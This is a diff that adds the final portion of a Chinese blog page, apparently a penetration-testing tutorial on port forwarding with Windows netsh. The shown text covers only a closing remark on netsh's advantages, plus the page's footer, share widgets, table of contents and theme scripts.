+<li>由于系统自带，使用相对方便灵活，能帮助解决大部分实际问题，减少自己上传工具的麻烦。一般使用于 存在 系统为 Windows 的边界主机的场景。</li>
+<li>同时支持 ipv4 和 ipv6 以及 TCP 和 UDP 的端口转发，扩展性较强。</li>
+</ol>
+
+      
+    </div>
+
+    <div class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透测试/"> #渗透测试 </a>
+          
+            <a href="/tags/APT/"> #APT </a>
+          
+            <a href="/tags/内网渗透/"> #内网渗透 </a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/02/11/fbi-empolyees-texts/">FBI雇员私人交流信息曝光 曾称库克为“伪君子”</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </div>
+  </div>
+
+
+
+    
+      <div class="post-spread">
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      </div>
+    
+
+    
+      <div class="comments" id="comments">
+        
+          <div class="ds-thread" data-thread-key="2018/02/11/netsh-tutorial/"
+               data-title="边界跨越简易入门 Windows 运维工具 netsh" data-url="http://blkstone.github.io/2018/02/11/netsh-tutorial/">
+          </div>
+        
+      </div>
+    
+  </div>
+
+
+        </div>
+
+        
+      </div>
+
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <div class="site-overview">
+        <div class="site-author motion-element">
+          <img class="site-author-image" src="/images/avatar.jpg" alt="Ray" />
+          <p class="site-author-name">Ray</p>
+        </div>
+        <p class="site-description motion-element">关于计算机科学的学习经历与精彩文章分享。</p>
+        <div class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">531</span>
+              <span class="site-state-item-name">文章</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">15</span>
+              <span class="site-state-item-name">分類</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">153</span>
+              <span class="site-state-item-name">標籤</span>
+              </a>
+          </div>
+
+        </div>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+              <a href="https://github.com/BLKStone" target="_blank">GitHub</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Twitter</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Weibo</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">DouBan</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">ZhiHu</a>
+            </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element">
+            <a href="http://creativecommons.org/licenses/by-nc-sa/4.0" class="cc-opacity" target="_blank">
+              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+      </div>
+
+      
+        <div class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#netsh-的使用前提"><span class="nav-number">1.</span> <span class="nav-text">netsh 的使用前提</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#netsh-是什么"><span class="nav-number">2.</span> <span class="nav-text">netsh 是什么</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#简单解释一下-netsh-portproxy-的工作方式"><span class="nav-number">3.</span> <span class="nav-text">简单解释一下 netsh portproxy 的工作方式</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实战中-netsh-可能的应用的渗透场景"><span class="nav-number">4.</span> <span class="nav-text">实战中 netsh 可能的应用的渗透场景</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Windows-Server-2003-下的-netsh"><span class="nav-number">5.</span> <span class="nav-text">Windows Server 2003 下的 netsh</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#使用-netsh-对目标主机防火墙进行简单管理"><span class="nav-number">6.</span> <span class="nav-text">使用 netsh 对目标主机防火墙进行简单管理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#对于-Windows-Server-2003-及以下系统"><span class="nav-number">6.1.</span> <span class="nav-text">对于 Windows Server 2003 及以下系统</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#对于高于-Windows-Server-2003-的系统"><span class="nav-number">6.2.</span> <span class="nav-text">对于高于 Windows Server 2003 的系统</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#关于操作防火墙时的注意事项"><span class="nav-number">7.</span> <span class="nav-text">关于操作防火墙时的注意事项</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#使用-netsh-修改防火墙规则"><span class="nav-number">8.</span> <span class="nav-text">使用 netsh 修改防火墙规则</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#根据端口"><span class="nav-number">8.1.</span> <span class="nav-text">根据端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#根据进程"><span class="nav-number">8.2.</span> <span class="nav-text">根据进程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ssh-中继示例"><span class="nav-number">9.</span> <span class="nav-text">ssh 中继示例</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#rdp中继示例"><span class="nav-number">10.</span> <span class="nav-text">rdp中继示例</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#数据库管理端口中继示例"><span class="nav-number">11.</span> <span class="nav-text">数据库管理端口中继示例</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RAT-正向中继"><span class="nav-number">12.</span> <span class="nav-text">RAT 正向中继</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RAT-反向中继-DNS隧道"><span class="nav-number">13.</span> <span class="nav-text">RAT 反向中继 (DNS隧道)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#关于利用-netsh-进行端口转发基本原则"><span class="nav-number">14.</span> <span class="nav-text">关于利用 netsh 进行端口转发基本原则</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#使用-netsh-进行端口转发的优势与弊端"><span class="nav-number">15.</span> <span class="nav-text">使用 netsh 进行端口转发的优势与弊端</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </div>
+      
+
+    </div>
+  </div>
+
+
+    </div>
+
+    <div id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy; &nbsp;  2015 - 
+  2018
+  <span class="with-love">
+    <i class="icon-heart"></i>
+  </span>
+  <span class="author">Ray</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 強力驅動
+</div>
+
+<div class="theme-info">
+  主題 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+
+      </div>
+    </div>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.3"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.3"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.3" id="motion.global"></script>
+
+
+
+  <script type="text/javascript" src="/js/search-toggle.js"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.3" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var $sidebarInner = $('.sidebar-inner');
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.didShow', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+          var self = this;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      $(indicator).velocity('stop').velocity({
+        opacity: action === 'show' ? 0.4 : 0
+      }, { duration: 100 });
+    }
+
+  });
+</script>
+
+
+  <script type="text/javascript" id="sidebar.nav">
+    $(document).ready(function () {
+      var html = $('html');
+
+      $('.sidebar-nav li').on('click', function () {
+        var item = $(this);
+        var activeTabClassName = 'sidebar-nav-active';
+        var activePanelClassName = 'sidebar-panel-active';
+        if (item.hasClass(activeTabClassName)) {
+          return;
+        }
+
+        var currentTarget = $('.' + activePanelClassName);
+        var target = $('.' + item.data('target'));
+
+        currentTarget.velocity('transition.slideUpOut', 200, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', 200)
+            .addClass(activePanelClassName);
+        });
+
+        item.siblings().removeClass(activeTabClassName);
+        item.addClass(activeTabClassName);
+      });
+
+      $('.post-toc a').on('click', function (e) {
+        e.preventDefault();
+        var offset = $(escapeSelector(this.getAttribute('href'))).offset().top;
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        });
+      });
+
+      // Expand sidebar on post detail page by default, when post has a toc.
+      var $tocContent = $('.post-toc-content');
+      if (isDesktop() && CONFIG.sidebar === 'post') {
+        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+          displaySidebar();
+        }
+      }
+    });
+  </script>
+
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+    });
+  </script>
+
+  
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+      processEscapes: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for (i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+  
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"blkstone"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+
+
+  
+  
+
+</body>
+</html>
